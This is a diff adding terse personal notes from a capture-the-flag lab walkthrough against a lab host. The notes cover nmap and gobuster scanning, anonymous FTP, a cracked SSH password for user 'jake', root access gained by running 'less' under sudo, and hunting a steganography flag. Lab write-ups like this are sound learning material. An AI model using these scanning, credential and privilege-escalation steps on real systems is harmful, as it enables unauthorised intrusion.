@@ -1,0 +1,27 @@
+first do an nmap
+	nmap -sC -sV -A 10.10.6.39
+Go to webpage
+	inspect element
+		have you ever heard of steganography
+gobuster dir -u 10.10.6.39 -w /usr/share/wordlists/dirb/big.txt 
+	NMAP is done and it allows for anonymous login
+		ls -la we see note_to_jake.txt
+			we have one user named jake
+			we get and open the file, we now see jake and amy
+			lets try to ssh into jake
+				we have jakes password
+				22][ssh] host: 10.10.6.39   login: jake   password: 987654321
+first check his priveleges
+	sudo -l
+		we are able to run less
+			sudo /usr/bin/less /root/root.txt
+We still need to find another flag though
+	right click on image and do a view background image
+wget image
+	wget http://10.10.6.39/brooklyn99.jpg
+we need a passphrase and the password above is not it
+	THIS WAS A DAMN JOKE LOL
+we need to ssh back in
+	from here we can cd /home/
+	cd to holt
+	cat user.txt
